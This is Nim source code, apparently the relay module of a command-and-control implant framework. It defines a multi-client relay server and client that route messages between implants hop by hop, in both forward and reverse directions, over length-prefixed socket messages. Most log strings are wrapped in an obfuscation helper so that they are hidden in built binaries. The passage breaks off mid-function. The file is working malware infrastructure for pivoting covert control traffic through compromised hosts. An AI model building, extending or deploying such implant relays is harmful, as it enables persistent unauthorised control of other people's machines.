import net, nativesockets, strutils, times, os, tables
import relay_protocol
import relay_config
import ../../util/strenc

const
    MAX_MESSAGE_SIZE* = 1024 * 1024  # 1MB max message size - prevents memory exhaustion
    HEADER_SIZE = 4  # 4 bytes for message length

# Global relay connection state - shared between modules
var isConnectedToRelay* = false

type
    RelayConnection* = object
        socket*: Socket
        isConnected*: bool
        remoteHost*: string
        remotePort*: int
        clientID*: string  # Track client ID for routing
        lastActivity*: int64  # Track last message time
    
    RelayServer* = object
        socket*: Socket
        port*: int
        isListening*: bool
        connections*: seq[RelayConnection]
        clientRegistry*: Table[string, int]  # ClientID → Connection index mapping

# Forward declarations for routing functions
proc routeMessage*(server: var RelayServer, msg: RelayMessage): bool
proc analyzeRoute*(route: seq[string], currentID: string): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int]
proc isResponseMessage*(msgType: RelayMessageType): bool
proc analyzeRouteDirection*(route: seq[string], currentID: string, isResponse: bool): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int, shouldRoute: bool]
proc debugRouteDecision*(msg: RelayMessage, currentID: string)
proc testDistributedRoutingSystem*(): tuple[passed: int, failed: int, details: seq[string]]

# === ROUTING FUNCTIONS FOR PERSISTENT ROUTE MANAGEMENT ===

# Get current relay/implant ID for route building with server state
proc getCurrentRelayID*(server: RelayServer): string =
    # CRITICAL FIX: Use consistent ID system for routing
    # Check if we're running as a relay server
    if server.isListening:
        # For relay server: Use the implant ID registered with C2 (NOT internal relay ID)
        let implantID = getCurrentImplantID()
        if implantID != "":
            when defined debug:
                echo "[ID] 🆔 Relay Server using C2 registered ID: " & implantID
            return implantID
        else:
            # Fallback for relay server without C2 registration
            when defined debug:
                echo "[ID] 🆔 Relay Server fallback to internal ID"
            return generateImplantID("RELAY-SERVER")
    else:
        # For relay client: Use relay client ID
        let clientID = getCurrentImplantID()
        if clientID != "":
            when defined debug:
                echo "[ID] 🆔 Relay Client using ID: " & clientID
            return clientID
        else:
            # Fallback for relay client
            when defined debug:
                echo "[ID] 🆔 Relay Client fallback to generated ID"
            return generateImplantID("RELAY-CLIENT")

# Backward compatibility: Get current relay/implant ID without server parameter
proc getCurrentRelayID*(): string =
    # Default implementation for backward compatibility
    let implantID = getCurrentImplantID()
    if implantID != "":
        return implantID
    
    # Fallback: generate relay-specific ID
    return generateImplantID("RELAY")

# === FASE 4: REVERSE ROUTING FUNCTIONS ===

# Determine if a message is a response type (needs reverse routing)
proc isResponseMessage*(msgType: RelayMessageType): bool =
    case msgType:
    of RESPONSE, HTTP_RESPONSE:
        result = true
        when defined debug:
            echo "[DEBUG] 🔙 Message type '" & $msgType & "' is a RESPONSE - needs reverse routing"
    else:
        result = false
        when defined debug:
            echo "[DEBUG] 🔽 Message type '" & $msgType & "' is FORWARD - needs downstream routing"

# Calculate the previous hop in the route (for response messages)
proc calculatePreviousHop*(route: seq[string], currentID: string): tuple[found: bool, previousHop: string] =
    result.found = false
    result.previousHop = ""
    
    when defined debug:
        echo "[DEBUG] 🔍 Calculating previous hop:"
        echo "[DEBUG] 🔍 - Current ID: '" & currentID & "'"
        echo "[DEBUG] 🔍 - Route: " & $route
    
    # Find our position in the route
    for i in 0..<route.len:
        if route[i] == currentID:
            when defined debug:
                echo "[DEBUG] 🔍 - Found current ID at position " & $i
            
            # If we're at position 0, we're the origin (no previous hop)
            if i == 0:
                when defined debug:
                    echo "[DEBUG] 🔍 - We are the ORIGIN - no previous hop"
                result.found = false
                return
            
            # Previous hop is the element before us in the route
            result.previousHop = route[i - 1]
            result.found = true
            when defined debug:
                echo "[DEBUG] 🔍 - Previous hop is: '" & result.previousHop & "'"
            return
    
    when defined debug:
        echo "[DEBUG] 🔍 - Current ID not found in route - this shouldn't happen!"

# Determine next hop for response routing (reverse path)
proc determineResponseHop*(route: seq[string], currentID: string): tuple[shouldRoute: bool, targetHop: string] =
    result.shouldRoute = false
    result.targetHop = ""
    
    when defined debug:
        echo "[DEBUG] 🔙 ┌─────────── RESPONSE ROUTING ───────────┐"
        echo "[DEBUG] 🔙 │ Current ID: '" & currentID & "' │"
        echo "[DEBUG] 🔙 │ Route: " & $route & " │"
        echo "[DEBUG] 🔙 └─────────────────────────────────────────┘"
    
    # Calculate where to send the response
    let prevHop = calculatePreviousHop(route, currentID)
    
    if prevHop.found:
        result.shouldRoute = true
        result.targetHop = prevHop.previousHop
        when defined debug:
            echo "[DEBUG] 🔙 ✅ Response should go to: '" & result.targetHop & "'"
    else:
        when defined debug:
            echo "[DEBUG] 🔙 ❌ No previous hop found - response reached origin"
        result.shouldRoute = false

# Enhanced route analysis for both forward and reverse routing
proc analyzeRouteDirection*(route: seq[string], currentID: string, isResponse: bool): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int, shouldRoute: bool] =
    result.hopsFromOrigin = route.len
    result.isForUs = false
    result.nextHop = ""
    result.shouldRoute = false
    
    when defined debug:
        let direction = if isResponse: "RESPONSE (reverse)" else: "FORWARD (downstream)"
        echo "[DEBUG] 🧭 Route analysis for " & direction & ":"
        echo "[DEBUG] 🧭 - Current ID: '" & currentID & "'"
        echo "[DEBUG] 🧭 - Route: " & $route
        echo "[DEBUG] 🧭 - Hops from origin: " & $result.hopsFromOrigin
    
    if isResponse:
        # RESPONSE ROUTING: Use reverse path
        let responseHop = determineResponseHop(route, currentID)
        result.shouldRoute = responseHop.shouldRoute
        result.nextHop = responseHop.targetHop
        
        if not result.shouldRoute:
            # Response reached the origin
            result.isForUs = true
            when defined debug:
                echo "[DEBUG] 🧭 - Response reached ORIGIN - processing locally"
        else:
            when defined debug:
                echo "[DEBUG] 🧭 - Response needs routing to: '" & result.nextHop & "'"
    else:
        # FORWARD ROUTING: Use existing logic
        if route.len > 0 and route[^1] == currentID:
            result.isForUs = true
            when defined debug:
                echo "[DEBUG] 🧭 - Forward message IS FOR US (final destination)"
        else:
            result.shouldRoute = true
            when defined debug:
                echo "[DEBUG] 🧭 - Forward message needs FORWARDING downstream"

# Safe function to parse 4 bytes into uint32 (little endian)
proc parseUint32LE(bytes: string): uint32 =
    if bytes.len != 4:
        return 0
    
    result = uint32(ord(bytes[0])) or
             (uint32(ord(bytes[1])) shl 8) or
             (uint32(ord(bytes[2])) shl 16) or
             (uint32(ord(bytes[3])) shl 24)

# Safe function to encode uint32 into 4 bytes (little endian)
proc encodeUint32LE(value: uint32): string =
    result = newString(4)
    result[0] = char(value and 0xFF)
    result[1] = char((value shr 8) and 0xFF)
    result[2] = char((value shr 16) and 0xFF)
    result[3] = char((value shr 24) and 0xFF)

# Create relay connection to upstream relay
proc connectToRelay*(host: string, port: int): RelayConnection =
    result.remoteHost = host
    result.remotePort = port
    result.isConnected = false
    
    try:
        result.socket = newSocket()
        result.socket.connect(host, Port(port))
        
        # CRITICAL: Set client socket to non-blocking mode ONCE at creation
        setBlocking(result.socket.getFd(), false)
        
        result.isConnected = true
        
        when defined verbose:
            echo obf("[DEBUG]: Connected to relay at ") & host & ":" & $port & obf(" (non-blocking mode)")
    except:
        result.isConnected = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to connect to relay at ") & host & ":" & $port

# Start relay server (NON-BLOCKING)
proc startRelayServer*(port: int): RelayServer =
    result.port = port
    result.connections = @[]
    result.clientRegistry = initTable[string, int]()  # Initialize client registry
    result.isListening = false
    
    try:
        result.socket = newSocket()
        result.socket.setSockOpt(OptReuseAddr, true)
        result.socket.bindAddr(Port(port))
        result.socket.listen()
        
        # CRITICAL: Set server socket to non-blocking mode ONCE at creation
        setBlocking(result.socket.getFd(), false)
        
        result.isListening = true
        
        when defined debug:
            echo obf("[SOCKET] FD=") & $int(result.socket.getFd()) & obf(" CREATED (server socket)")
            echo obf("[STATE] Server listening on port ") & $port
            echo obf("[RELAY] 🚀 Multi-Client Relay server started on port ") & $port & obf(" (non-blocking mode)")
            echo obf("[MULTI-CLIENT] Ready to accept multiple relay clients on same port")
    except:
        result.isListening = false
        when defined debug:
            echo obf("[CRITICAL] Failed to start relay server on port ") & $port & obf(": ") & getCurrentExceptionMsg()

# Accept new downstream connection (NON-BLOCKING)
proc acceptConnection*(server: var RelayServer): RelayConnection =
    result.isConnected = false
    
    if not server.isListening:
        when defined debug:
            echo obf("[RELAY] Server not listening, cannot accept connection")
        return
    
    try:
        when defined debug:
            echo obf("[RELAY] acceptConnection: Attempting to accept new connection")
        
        var clientSocket: Socket
        server.socket.accept(clientSocket)
        
        # CRITICAL: Set client socket to non-blocking mode ONCE at creation
        setBlocking(clientSocket.getFd(), false)
        
        result.socket = clientSocket
        result.isConnected = true
        result.remoteHost = ""  # Will be filled by client registration
        result.remotePort = 0
        result.clientID = ""  # Will be set during registration
        result.lastActivity = epochTime().int64
        
        # Only add if we don't already have this connection
        server.connections.add(result)
        
        when defined debug:
            echo obf("[SOCKET] FD=") & $int(clientSocket.getFd()) & obf(" CREATED (client connection)")
            echo obf("[STATE] New connection created - Total connections: ") & $server.connections.len
            echo obf("[MULTI-CLIENT] 🔗 Accepted new relay client connection, total: ") & $server.connections.len
    except:
        let errorMsg = getCurrentExceptionMsg()
        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
            result.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to accept connection: ") & errorMsg
        else:
            # No connections waiting - normal for non-blocking
            result.isConnected = false
            when defined debug:
                echo obf("[RELAY] No connections waiting (non-blocking): ") & errorMsg

# Send message through connection - WITH TIMEOUT PROTECTION
proc sendMessage*(conn: var RelayConnection, msg: RelayMessage): bool =
    # RACE CONDITION PROTECTION: Check connection state atomically
    if not conn.isConnected:
        when defined debug:
            echo obf("[SOCKET] Cannot send message - connection not active")
        return false
    
    try:
        let serializedMsg = serialize(msg)
        let msgLength = uint32(serializedMsg.len)
        
        # Validate message size before sending
        if msgLength > MAX_MESSAGE_SIZE:
            when defined debug:
                echo obf("[RELAY] Message too large: ") & $msgLength & obf(" bytes, max allowed: ") & $MAX_MESSAGE_SIZE
            return false
        
        when defined debug:
            echo obf("[RELAY] Sending message of length: ") & $msgLength
        
        # CRITICAL FIX: Set socket to non-blocking mode for send to prevent hanging
        # This prevents infinite blocking when server closes connection
        conn.socket.getFd().setBlocking(false)
        
        # Send message length first (4 bytes) - using safe encoding
        let lengthHeader = encodeUint32LE(msgLength)
        
        when defined debug:
            echo obf("[RELAY] 💀 HANG DETECTION: About to send header - ") & $lengthHeader.len & obf(" bytes")
            echo obf("[RELAY] 💀 CRITICAL: If this hangs, client is corrupted!")
            
            # BASIC SOCKET FD CHECK to detect corruption before hang
            try:
                let fd = conn.socket.getFd()
                if fd == osInvalidSocket:
                    echo obf("[RELAY] 💀 SOCKET FD CORRUPTED - would cause infinite hang!")
                    conn.isConnected = false
                    return false
                else:
                    echo obf("[RELAY] ✅ Socket FD valid: ") & $int(fd)
            except:
                echo obf("[RELAY] 💀 SOCKET CHECK FAILED - client corrupted!")
                conn.isConnected = false
                return false
        
        # CRITICAL POINT: This is where the hang occurs in cycle #39
        let headerBytesSent = conn.socket.send(lengthHeader.cstring, lengthHeader.len)
        
        when defined debug:
            echo obf("[RELAY] 🎉 socket.send() COMPLETED! (did not hang)")
            echo obf("[RELAY] 📊 Send result: ") & $headerBytesSent & obf("/") & $lengthHeader.len & obf(" bytes")
        
        # Check if send was successful
        if headerBytesSent != lengthHeader.len:
            when defined debug:
                echo obf("[RELAY] ❌ Header send failed: sent ") & $headerBytesSent & obf(" of ") & $lengthHeader.len & obf(" bytes")
                echo obf("[RELAY] ❌ Server likely closed connection")
            conn.isConnected = false
            return false
        
        when defined debug:
            echo obf("[RELAY] Header sent successfully")
        
        # Send message data
        when defined debug:
            echo obf("[RELAY] Sending message data: ") & $serializedMsg.len & obf(" bytes")
        
        # NON-BLOCKING SEND for message data
        let msgBytesSent = conn.socket.send(serializedMsg.cstring, serializedMsg.len)
        
        # Check if message data send was successful
        if msgBytesSent != serializedMsg.len:
            when defined debug:
                echo obf("[RELAY] ❌ Message data send failed: sent ") & $msgBytesSent & obf(" of ") & $serializedMsg.len & obf(" bytes")
                echo obf("[RELAY] ❌ Server likely closed connection")
            conn.isConnected = false
            return false
        
        when defined debug:
            echo obf("[RELAY] Message data sent successfully")
        
        when defined verbose:
            echo obf("[DEBUG]: Sent message type ") & $msg.msgType & obf(" to ") & conn.remoteHost
        
        when defined debug:
            echo obf("[RELAY] ✅ Message sent successfully")
        
        return true
    except:
        # TIMEOUT OR CONNECTION ERROR
        let errorMsg = getCurrentExceptionMsg()
        when defined debug:
            echo obf("[RELAY] 💥 Send failed: ") & errorMsg
            if "would block" in errorMsg.toLower() or "temporarily unavailable" in errorMsg.toLower():
                echo obf("[RELAY] 🔍 Send would block - server connection dead")
            else:
                echo obf("[RELAY] 🔍 Send error - connection problem")
        
        # ATOMIC STATE CHANGE: Mark as disconnected only if still connected
        if conn.isConnected:
            conn.isConnected = false
            when defined debug:
                echo obf("[STATE] Connection marked as disconnected due to send error: ") & errorMsg
        return false

# Receive message from connection
proc receiveMessage*(conn: var RelayConnection): RelayMessage =
    if not conn.isConnected:
        when defined debug:
            echo obf("[RELAY] Cannot receive message, connection not active")
        return
    
    try:
        # Receive message length first (4 bytes) - SECURE VERSION
        var lengthBuffer = newString(HEADER_SIZE)
        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
        
        if bytesRead != HEADER_SIZE:
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to receive message length, got ") & $bytesRead & obf(" bytes, expected ") & $HEADER_SIZE
            return
        
        # Parse length safely - NO MORE UNSAFE CAST!
        let msgLength = parseUint32LE(lengthBuffer)
               
        if msgLength == 0:
            when defined debug:
                echo obf("[RELAY] Invalid message length: 0")
            conn.isConnected = false
            return
        
        if msgLength > MAX_MESSAGE_SIZE:
            when defined debug:
                echo obf("[RELAY] Message too large: ") & $msgLength & obf(" bytes, max allowed: ") & $MAX_MESSAGE_SIZE
            conn.isConnected = false  # Disconnect malicious client
            return
        
        when defined debug:
            echo obf("[RELAY] Receiving message of length: ") & $msgLength
        
        # Receive message data - now safe with validated length
        var msgBuffer = newString(int(msgLength))
        let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
        
        if msgBytesRead != int(msgLength):
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to receive full message, got ") & $msgBytesRead & obf(" of ") & $msgLength & obf(" bytes")
            return
        
        result = deserialize(msgBuffer)
        
        when defined debug:
            echo obf("[RELAY] Received message type ") & $result.msgType & obf(" from ") & result.fromID
            
    except:
        conn.isConnected = false
        when defined debug:
            echo obf("[RELAY] Failed to receive message: ") & getCurrentExceptionMsg()

# Close connection
proc closeConnection*(conn: var RelayConnection) =
    if conn.isConnected:
        try:
            when defined debug:
                echo obf("[SOCKET] FD=") & $int(conn.socket.getFd()) & obf(" CLOSING")
            conn.socket.close()
            conn.isConnected = false  # CRITICAL: Move inside try block for atomic operation
            when defined debug:
                echo obf("[SOCKET] Connection closed successfully")
        except:
            # Socket already closed or invalid - safe to ignore
            conn.isConnected = false  # Ensure state is consistent
            when defined debug:
                echo obf("[SOCKET] Connection already closed or invalid: ") & getCurrentExceptionMsg()
    else:
        when defined debug:
            echo obf("[SOCKET] Connection already marked as closed, skipping")

# Register client in the multi-client registry
proc registerClient*(server: var RelayServer, clientID: string, connectionIndex: int) =
    server.clientRegistry[clientID] = connectionIndex
    if connectionIndex < server.connections.len:
        server.connections[connectionIndex].clientID = clientID
        server.connections[connectionIndex].lastActivity = epochTime().int64
        
        when defined debug:
            echo obf("[MULTI-CLIENT] 📝 Registered client: ") & clientID & obf(" at connection index ") & $connectionIndex
            echo obf("[MULTI-CLIENT] 📊 Total registered clients: ") & $server.clientRegistry.len

# Send message to specific client by ID (UNICAST)
proc sendToClient*(server: var RelayServer, clientID: string, msg: RelayMessage): bool =
    when defined debug:
        echo obf("[UNICAST] 🎯 Attempting to send to clientID: '") & clientID & obf("'")
        echo obf("[UNICAST] 🎯 Message type: ") & $msg.msgType
        echo obf("[UNICAST] 🎯 Registry has ") & $server.clientRegistry.len & obf(" clients")
        var registryContents = ""
        for id, idx in server.clientRegistry:
            if registryContents != "": registryContents.add(", ")
            registryContents.add("'" & id & "'→" & $idx)
        echo obf("[UNICAST] 🎯 Registry contents: [") & registryContents & obf("]")
    
    if not server.clientRegistry.hasKey(clientID):
        when defined debug:
            echo obf("[UNICAST] ❌ Client '") & clientID & obf("' NOT FOUND in registry!")
            echo obf("[UNICAST] ❌ This is the root cause of command delivery failure!")
        return false
    
    let connectionIndex = server.clientRegistry[clientID]
    if connectionIndex >= server.connections.len:
        when defined debug:
            echo obf("[MULTI-CLIENT] ❌ Invalid connection index for client: ") & clientID
        # Clean up invalid registry entry
        server.clientRegistry.del(clientID)
        return false
    
    var conn = server.connections[connectionIndex]
    if not conn.isConnected:
        when defined debug:
            echo obf("[MULTI-CLIENT] ❌ Client connection dead: ") & clientID
        # Clean up dead connection from registry
        server.clientRegistry.del(clientID)
        return false
    
    when defined debug:
        echo obf("[MULTI-CLIENT] 📤 Sending message to client: ") & clientID & obf(" (type: ") & $msg.msgType & obf(")")
    
    let success = sendMessage(conn, msg)
    if success:
        # Update connection back to array (sendMessage might modify it)
        server.connections[connectionIndex] = conn
        server.connections[connectionIndex].lastActivity = epochTime().int64
        when defined debug:
            echo obf("[MULTI-CLIENT] ✅ Message sent to client: ") & clientID
    else:
        when defined debug:
            echo obf("[MULTI-CLIENT] ❌ Failed to send message to client: ") & clientID
        # Clean up failed connection from registry
        server.clientRegistry.del(clientID)
    
    return success

# Get list of connected clients
proc getConnectedClients*(server: RelayServer): seq[string] =
    result = @[]
    for clientID, index in server.clientRegistry:
        if index < server.connections.len and server.connections[index].isConnected:
            result.add(clientID)

# Close relay server
proc closeRelayServer*(server: var RelayServer) =
    if server.isListening:
        try:
            when defined debug:
                echo obf("[STATE] Shutting down relay server on port ") & $server.port
                echo obf("[STATE] Closing ") & $server.connections.len & obf(" active connections")
                echo obf("[MULTI-CLIENT] Clearing ") & $server.clientRegistry.len & obf(" registered clients")
            
            # Close all client connections
            for conn in server.connections.mitems:
                closeConnection(conn)
            server.connections = @[]
            
            # Clear client registry
            server.clientRegistry.clear()
            
            # Close server socket
            when defined debug:
                echo obf("[SOCKET] FD=") & $int(server.socket.getFd()) & obf(" CLOSING (server socket)")
            server.socket.close()
            when defined debug:
                echo obf("[SOCKET] Server socket closed successfully")
        except:
            when defined debug:
                echo obf("[CRITICAL] Error during server shutdown: ") & getCurrentExceptionMsg()
        
        server.isListening = false
        when defined debug:
            echo obf("[STATE] Multi-client relay server shutdown complete")

# Poll for incoming messages (NON-BLOCKING)
proc pollMessages*(conn: var RelayConnection, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not conn.isConnected:
        when defined debug:
            echo obf("[RELAY] pollMessages: Connection not active")
        return
    
    try:
        when defined debug:
            echo obf("[RELAY] pollMessages: Attempting to read from socket (already non-blocking)")
        
        # Try to receive message length header (4 bytes) - socket already non-blocking
        var lengthBuffer = newString(HEADER_SIZE)
        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
        
        when defined debug:
            echo obf("[RELAY] pollMessages: Header recv returned ") & $bytesRead & obf(" bytes")
        
        if bytesRead == HEADER_SIZE:
            # We have a complete header, parse it
            let msgLength = parseUint32LE(lengthBuffer)
            
            when defined debug:
                echo obf("[RELAY] pollMessages: Message length: ") & $msgLength
            
            if msgLength > 0 and msgLength <= MAX_MESSAGE_SIZE:
                # Try to receive the full message
                var msgBuffer = newString(int(msgLength))
                let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
                
                when defined debug:
                    echo obf("[RELAY] pollMessages: Message recv returned ") & $msgBytesRead & obf(" of ") & $msgLength & obf(" bytes")
                
                if msgBytesRead == int(msgLength):
                    # Complete message received
                    let msg = deserialize(msgBuffer)
                    if validateMessage(msg):
                        when defined debug:
                            echo obf("[RELAY] pollMessages: Valid message received")
                        result.add(msg)
                else:
                    when defined debug:
                        echo obf("[RELAY] pollMessages: Incomplete message received")
            else:
                when defined debug:
                    echo obf("[RELAY] pollMessages: Invalid message length")
                conn.isConnected = false
        elif bytesRead == 0:
            # Connection closed
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] pollMessages: Connection closed by peer")
        else:
            # bytesRead < 0 means no data available (EAGAIN/EWOULDBLOCK) - normal for non-blocking
            when defined debug:
                echo obf("[RELAY] pollMessages: No data available (non-blocking)")
        
    except:
        let errorMsg = getCurrentExceptionMsg()
        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] pollMessages: Connection error: ") & errorMsg
        else:
            when defined debug:
                echo obf("[RELAY] pollMessages: No data available (exception): ") & errorMsg

# Clean up dead connections and client registry
proc cleanupConnections*(server: var RelayServer) =
    var activeConnections: seq[RelayConnection] = @[]
    var newClientRegistry = initTable[string, int]()
    var removedCount = 0
    var newIndex = 0
    
    when defined debug:
        echo obf("[CLEANUP] 🧹 BEFORE cleanup - Registry state:")
        for id, idx in server.clientRegistry:
            echo obf("[CLEANUP] 🧹   ") & id & obf(" → connection ") & $idx
    
    for i, conn in server.connections:
        # CRITICAL FIX: Validate connection is REALLY dead before cleanup
        var connectionReallyDead = false
        
        if not conn.isConnected:
            # Double-check: verify socket is actually closed
            try:
                if conn.socket != nil:
                    let socketFd = conn.socket.getFd()
                    if socketFd == osInvalidSocket:
                        connectionReallyDead = true
                        when defined debug:
                            echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket FD is invalid - confirmed DEAD")
                    else:
                        # Socket FD is valid but marked as not connected - TEST if still responsive
                        var testBuffer = newString(1)
                        let testResult = conn.socket.recv(testBuffer, 1)
                        if testResult == 0:
                            connectionReallyDead = true
                            when defined debug:
                                echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket recv=0 - confirmed DEAD")
                        else:
                            # Socket is responsive - mark as connected again!
                            server.connections[i].isConnected = true
                            when defined debug:
                                echo obf("[CLEANUP] 🔄 Connection ") & $i & obf(" REVIVED - was marked dead but socket is responsive!")
                else:
                    connectionReallyDead = true
                    when defined debug:
                        echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket is nil - confirmed DEAD")
            except:
                connectionReallyDead = true
                when defined debug:
                    echo obf("[CLEANUP] ✅ Connection ") & $i & obf(" socket test failed - confirmed DEAD: ") & getCurrentExceptionMsg()
        
        # Keep connection if it's connected OR if we revived it
        if conn.isConnected:
            activeConnections.add(conn)
            # CRITICAL FIX: Only update registry if client is properly registered
            if conn.clientID != "" and conn.clientID != "PENDING-REGISTRATION":
                newClientRegistry[conn.clientID] = newIndex
                when defined debug:
                    echo obf("[CLEANUP] ✅ Remapped client ") & conn.clientID & obf(" from index ") & $i & obf(" to ") & $newIndex
                    echo obf("[CLEANUP] ✅ Client ID preserved: '") & conn.clientID & obf("' remains mapped to new index ") & $newIndex
            newIndex += 1
        elif connectionReallyDead:
            # CRITICAL FIX: Close socket before removing dead connection
            # This prevents file descriptor leaks
            try:
                if conn.socket != nil:
                    when defined debug:
                        echo obf("[CLEANUP] Closing dead connection socket FD=") & $int(conn.socket.getFd())
                    conn.socket.close()
                    when defined debug:
                        echo obf("[CLEANUP] Dead connection socket closed successfully")
            except:
                when defined debug:
                    echo obf("[CLEANUP] Dead connection socket already closed or invalid: ") & getCurrentExceptionMsg()
            
            # Remove from client registry if registered
            if conn.clientID != "":
                when defined debug:
                    echo obf("[MULTI-CLIENT] 🗑️  Removing dead client from registry: ") & conn.clientID
            
            removedCount += 1
            when defined debug:
                echo obf("[CLEANUP] Removing dead connection (socket properly closed)")
    
    server.connections = activeConnections
    server.clientRegistry = newClientRegistry
    
    when defined debug:
        if removedCount > 0:
            echo obf("[CLEANUP] ✅ Memory leak fixed: Removed ") & $removedCount & obf(" dead connections, ") & $activeConnections.len & obf(" remaining")
            echo obf("[CLEANUP] File descriptors properly released for ") & $removedCount & obf(" connections")
            echo obf("[MULTI-CLIENT] 🔄 Registry updated: ") & $newClientRegistry.len & obf(" clients mapped to new indices")
        
        echo obf("[CLEANUP] 🧹 AFTER cleanup - Final state:")
        for i, conn in server.connections:
            let status = if conn.isConnected: "ACTIVE" else: "DEAD"
            let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
            echo obf("[CLEANUP] 🧹   Connection ") & $i & obf(": ") & clientInfo & obf(" (") & status & obf(")")
        
        echo obf("[CLEANUP] 🧹 AFTER cleanup - Registry mapping:")
        for id, idx in server.clientRegistry:
            if idx < server.connections.len:
                let actualClientID = server.connections[idx].clientID
                if actualClientID == id:
                    echo obf("[CLEANUP] 🧹   ✅ ") & id & obf(" → connection ") & $idx & obf(" (CONSISTENT)")
                else:
                    echo obf("[CLEANUP] 🧹   🚨 ") & id & obf(" → connection ") & $idx & obf(" but connection has ID: '") & actualClientID & obf("' (INCONSISTENT!)")
            else:
                echo obf("[CLEANUP] 🧹   🚨 ") & id & obf(" → connection ") & $idx & obf(" (OUT OF BOUNDS!)")
        
        if server.clientRegistry.len != activeConnections.len:
            var unregisteredCount = 0
            for conn in activeConnections:
                if conn.clientID == "" or conn.clientID == "PENDING-REGISTRATION":
                    unregisteredCount += 1
            let registeredCount = activeConnections.len - unregisteredCount
            if registeredCount != server.clientRegistry.len:
                echo obf("[CLEANUP] 🚨 REGISTRY MISMATCH: ") & $server.clientRegistry.len & obf(" registry entries, but ") & $registeredCount & obf(" registered connections!")

# Poll relay server for new connections and messages (NON-BLOCKING)
proc pollRelayServer*(server: var RelayServer, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not server.isListening:
        when defined debug:
            echo obf("[RELAY] Cannot poll server, not listening")
        return
    
    when defined debug:
        echo obf("[RELAY] Polling server with ") & $server.connections.len & obf(" connections")
    
    try:
        # Only try to accept new connections if we don't have any active connections
        # This prevents the "Bad file descriptor" error when connections already exist
        var hasActiveConnections = false
        for conn in server.connections:
            if conn.isConnected:
                hasActiveConnections = true
                break
        
        # Check server socket health BEFORE attempting operations
        try:
            # Test server socket health by checking if it's still valid
            let serverFd = server.socket.getFd()
            if serverFd == osInvalidSocket:
                when defined debug:
                    echo obf("[CRITICAL] 🚨 SERVER SOCKET CORRUPTION DETECTED!")
                    echo obf("[CRITICAL] 🚨 Server FD is invalid: ") & $int(serverFd)
                    echo obf("[CRITICAL] 🚨 Port: ") & $server.port & obf(", Connections: ") & $server.connections.len
                    echo obf("[RELAY] CRITICAL: Server socket is invalid, stopping server")
                server.isListening = false
                return result
        except:
            when defined debug:
                echo obf("[CRITICAL] 🚨 CANNOT ACCESS SERVER SOCKET!")
                echo obf("[CRITICAL] 🚨 Exception: ") & getCurrentExceptionMsg()
                echo obf("[CRITICAL] 🚨 Port: ") & $server.port & obf(", Connections: ") & $server.connections.len
                echo obf("[RELAY] CRITICAL: Cannot access server socket, stopping server")
            server.isListening = false
            return result

        # MULTI-CLIENT: Always try to accept new connections (non-blocking)
        try:
            when defined debug:
                echo obf("[MULTI-CLIENT] Checking for new connections (current: ") & $server.connections.len & obf(")")
            
            var newConn = acceptConnection(server)
            if newConn.isConnected:
                when defined debug:
                    echo obf("[MULTI-CLIENT] 🔗 New client connection accepted! Total connections: ") & $server.connections.len
        except:
            let errorMsg = getCurrentExceptionMsg()
            if "Bad file descriptor" in errorMsg:
                when defined debug:
                    echo obf("[CRITICAL] 🚨 SOCKET CORRUPTION: Bad file descriptor detected!")
                    echo obf("[CRITICAL] 🚨 Server Port: ") & $server.port
                    echo obf("[CRITICAL] 🚨 Active Connections: ") & $server.connections.len
                    echo obf("[CRITICAL] 🚨 Error Message: ") & errorMsg
                    echo obf("[RELAY] CRITICAL: Server socket corrupted - ") & errorMsg
                    echo obf("[RELAY] CRITICAL: Stopping relay server due to socket corruption")
                server.isListening = false  # Stop the corrupted server
                return result
            elif "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
                when defined debug:
                    echo obf("[RELAY] Failed to accept connection: ") & errorMsg
            # No new connections available, that's normal for non-blocking

        # Check existing connections for messages (NON-BLOCKING)
        for i, conn in server.connections.mpairs:
            if conn.isConnected:
                when defined debug:
                    echo obf("[RELAY] Checking connection ") & $i & obf(" for messages")
                
                # READ ALL AVAILABLE MESSAGES from this connection
                var messagesRead = 0
                while true:
                    try:
                        # Try to receive message length header (4 bytes) - socket already non-blocking
                        var lengthBuffer = newString(HEADER_SIZE)
                        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
                        
                        if bytesRead == HEADER_SIZE:
                            # We have a complete header, parse it
                            let msgLength = parseUint32LE(lengthBuffer)
                            
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" message length: ") & $msgLength
                            
                            if msgLength > 0 and msgLength <= MAX_MESSAGE_SIZE:
                                # Try to receive the full message
                                var msgBuffer = newString(int(msgLength))
                                let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
                                
                                if msgBytesRead == int(msgLength):
                                    # Complete message received
                                    let msg = deserialize(msgBuffer)
                                    if validateMessage(msg):
                                        messagesRead += 1
                                        when defined debug:
                                            echo obf("[RELAY] Valid message received from connection ") & $i & obf(" (message #") & $messagesRead & obf(", type: ") & $msg.msgType & obf(")")
                                        
                                        # IDENTITY DEBUGGING: Log every message with connection and ID info
                                        when defined debug:
                                            echo obf("[IDENTITY] 🔍 Connection ") & $i & obf(" → Message type: ") & $msg.msgType & obf(", fromID: '") & msg.fromID & obf("', current clientID: '") & conn.clientID & obf("'")
                                        
                                        # AUTO-REGISTER: Only register clients with FINAL IDs (not PENDING-REGISTRATION)
                                        if conn.clientID == "" and msg.fromID != "" and msg.fromID != "PENDING-REGISTRATION":
